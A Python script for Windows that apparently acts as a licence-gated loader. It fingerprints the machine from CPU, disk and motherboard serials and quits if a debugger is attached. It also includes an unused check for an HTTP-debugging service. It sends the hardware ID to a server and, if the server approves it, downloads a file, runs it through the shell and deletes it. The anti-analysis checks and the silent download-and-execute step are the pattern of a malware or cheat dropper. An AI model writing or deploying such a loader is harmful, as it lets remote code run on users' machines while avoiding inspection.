import os
import subprocess
import requests
import sys
import uuid
import ctypes
import tempfile
import wmi

# HWID generation
def generate_hwid():
    c = wmi.WMI()
    # Getting the serial number of the processor
    processor = c.Win32_Processor()[0].ProcessorId.strip()
    # Getting the serial number of the hard drive
    hard_drive = c.Win32_DiskDrive()[0].SerialNumber.strip()
    # Getting the serial number of the motherboard
    motherboard = c.Win32_BaseBoard()[0].SerialNumber.strip()
    
    unique_string = processor + hard_drive + motherboard
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, unique_string))

# Checking for a debugger
def is_debugger_present():
    is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent
    return is_debugger_present() != 0

# Checking the HTTPDebuggerPro service
def is_httpdebuggerpro_present():
    try:
        service_name = "HTTPDebuggerPro"
        output = subprocess.check_output(f"sc query {service_name}", shell=True)
        return "RUNNING" in output.decode('utf-8')
    except subprocess.CalledProcessError:
        return False

# Server check
def check_server():
    try:
        response = requests.get('http://localhost/check.php')
        return response.text == 'OK'
    except requests.RequestException:
        return False

# Contacting the server with HWID
def contact_server_with_hwid(hwid):
    try:
        response = requests.post('http://localhost/hwid.php', data={'hwid': hwid})
        return response.text
    except requests.RequestException:
        return 'Error'

# Download and run the file
def download_and_execute(hwid, url):
    temp_dir = tempfile.gettempdir()
    local_filename = os.path.join(temp_dir, 'file.txt')

    headers = {'User-Agent': hwid}
    with requests.get(url, headers=headers, stream=True) as r:
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                if chunk: 
                    f.write(chunk)
    
    subprocess.run(local_filename, shell=True)

    os.remove(local_filename)

# Main code
if __name__ == '__main__':
    if is_debugger_present():
        print("Debugger detected!")
        sys.exit(1)

    hwid = generate_hwid()
    if not check_server():
        print("Cannot connect to the server.")
        sys.exit(1)

    server_response = contact_server_with_hwid(hwid)
    if server_response == 'Allowed':
        download_url = 'http://localhost/Neshka/file.txt'
        download_and_execute(hwid, download_url)
    else:
        print(f"HWID: {hwid}")
        print("Access denied. Contact support to add your HWID.")
